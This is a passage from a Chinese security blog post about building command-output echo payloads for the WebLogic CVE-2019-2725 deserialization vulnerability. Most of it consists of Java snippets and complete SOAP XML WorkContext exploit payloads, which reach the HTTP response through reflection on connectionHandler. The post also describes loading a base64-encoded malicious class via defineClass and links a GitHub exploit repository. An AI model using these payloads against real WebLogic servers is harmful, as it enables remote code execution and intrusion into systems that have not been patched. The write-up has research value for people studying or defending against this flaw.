+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">&quot;lfcmd&quot;</span>);</span><br><span class="line">weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(lfcmd));</span><br><span class="line">outputStream.flush();</span><br><span class="line">response.getWriter().write(<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/%E6%8E%A5%E5%8F%97header%E5%8F%82%E6%95%B0.jpg" alt="接受header参数" title="接受header参数"></p>
+<h1 id="12-1-3回显构造"><a href="#12-1-3回显构造" class="headerlink" title="12.1.3回显构造"></a>12.1.3回显构造</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getCurrentWork&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getResponse&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletOutputStream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;writeStream&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.xml.util.StringInputStream&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>2222222222<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;flush&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getWriter&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现拿前面的回显不能用了。在cmd窗口报错显示<code>java.lang.NoSuchMethodException: &lt;unbound&gt;=ContainerSupportProviderImpl$WlsRequestExecutor.getResponse();</code>。我们在response下断点，然后关注是否在<code>weblogic.work.ExecuteThread</code>这个线程类中。</p>
+<p>发现<code>getCurrentWork</code>获取的是<code>ContainerSupportProviderImpl$WlsRequestExecutor</code>类，这个类没有getResponse函数。</p>
+<p>但是在<code>ContainerSupportProviderImpl$WlsRequestExecutor</code>类发现里面有一个属性，是能够获取到response的。<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/WlsRequestExecutor%E8%83%BDgetResponse.jpg" alt="WlsRequestExecutor能getResponse" title="WlsRequestExecutor能getResponse"></p>
+<p>但是这个connectionHandler并没有getter，所以无法使用property=”connectionHandler”属性，只能通过反射的方式去获取。只要能够getResponse后面流程差不多。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)<span class="keyword">this</span>.getCurrentWork()).getClass().getDeclaredField(<span class="string">&quot;connectionHandler&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(<span class="keyword">this</span>.getCurrentWork());</span><br><span class="line">httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(<span class="string">&quot;xxxxxx&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+
+<p>转成xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getCurrentWork&quot;</span> <span class="attr">id</span>=<span class="string">&quot;current_work&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">             <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getCurrentWork&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getClass&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getDeclaredField&quot;</span> <span class="attr">id</span>=<span class="string">&quot;field&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>connectionHandler<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;field&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;setAccessible&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">id</span>=<span class="string">&quot;http_conn&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;current_work&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;http_conn&quot;</span>&gt;</span></span><br><span class="line">                 <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletRequest&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getResponse&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletOutputStream&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;writeStream&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.xml.util.StringInputStream&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>33333333333333<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;flush&quot;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getWriter&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>进行简化</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getCurrentWork&quot;</span> <span class="attr">id</span>=<span class="string">&quot;current_work&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getClass&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getDeclaredField&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>connectionHandler<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;setAccessible&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;current_work&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletRequest&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getResponse&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletOutputStream&quot;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;writeStream&quot;</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.xml.util.StringInputStream&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>lufei test<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;flush&quot;</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getWriter&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h1><p>最后一步，使用defineclass还原恶意class，这个类比较好的是可以把一个类变成一个模块，到处使用，非常nice。当然也可以不用这个类。我这里直接转成了base64，因为有现成的文件转换工具。具体代码请看github。</p>
+<p>Github地址：<br><a target="_blank" rel="noopener" href="https://github.com/lufeirider/CVE-2019-2725">https://github.com/lufeirider/CVE-2019-2725</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2272" title="defineClass在java反序列化当中的利用">defineClass在java反序列化当中的利用</a></p>
+<p>shack2 CVE-2017-10271反序列化工具</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/" title="weblogic-2019-2725回显构造" target="_blank" rel="external">https://lufe1.cn/2019/05/29/weblogic-2019-2725回显构造/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/07/28/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/" title="一次应急挖矿木马"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/04/23/%E5%B0%B1%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9Github%E6%B3%84%E9%9C%B2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/" title="就哔哩哔哩Github泄露的一些思考"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
